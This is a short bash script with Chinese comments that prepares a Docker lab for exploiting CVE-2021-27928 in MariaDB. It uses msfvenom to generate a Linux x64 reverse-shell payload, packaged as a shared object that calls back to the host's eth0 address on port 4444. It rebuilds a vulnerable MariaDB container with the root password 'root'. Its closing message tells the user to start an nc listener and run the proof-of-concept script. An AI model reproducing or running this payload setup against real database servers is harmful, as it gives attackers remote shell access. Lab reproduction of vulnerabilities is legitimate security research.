#!/bin/bash

# 获取eth0网络接口的IP地址
ip=$(ip addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')

if [ -z "$ip" ]; then
  echo "无法获取eth0的IP地址"
  exit 1
fi

# 使用msfvenom生成payload
msfvenom -p linux/x64/shell_reverse_tcp LHOST="$ip" LPORT=4444 -f elf-so -o poc/CVE-2021-27928.so
# 重置容器 
docker stop cve_2021_27928 \
&& docker rm cve_2021_27928 \
&& docker rmi cve_2021_27928
# 启动容器
docker build -t cve_2021_27928 .
docker run -d --name cve_2021_27928  -e MARIADB_ROOT_PASSWORD=root cve_2021_27928 

docker exec -it cve_2021_27928 bash -c "ip a && echo '提示：请开启nc监听后, 在poc目录执行 ./poc.sh'"


